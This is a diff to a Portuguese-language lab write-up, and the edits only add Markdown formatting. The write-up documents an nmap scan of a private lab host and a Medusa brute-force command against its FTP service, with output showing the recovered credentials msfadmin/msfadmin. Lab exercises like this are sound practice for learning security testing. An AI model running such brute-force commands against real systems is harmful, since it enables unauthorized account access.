@@ -32,13 +32,13 @@ nmap -sV -p- 192.168.56.101
 ```
 
 Serviços-alvo identificados (com base no scan):
-
+```
 Porta 21/tcp: FTP (vsftpd 2.3.4)
 Porta 80/tcp: HTTP (Apache httpd 2.2.8)
 Porta 139/tcp: netbios-ssn (Samba smbd 3.x - 4.x)
 Porta 445/tcp: netbios-ssn (Samba smbd 3.x - 4.x)
-
-4. ⚔️ Execução dos Ataques (Medusa)
+```
+## 4. ⚔️ Execução dos Ataques (Medusa)
 Foram utilizadas wordlists simples para simular o ataque.
 
 user.txt (Exemplo de usuários)
@@ -66,11 +66,12 @@ Comando:
 ```Bash
 medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp
 ```
+```
 -h: Host (alvo)
 -U: Arquivo de usuários
 -P: Arquivo de senhas
 -M: Módulo (serviço) a ser atacado
-
+```
 Resultado:
 ```
 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Pass: msfadmin
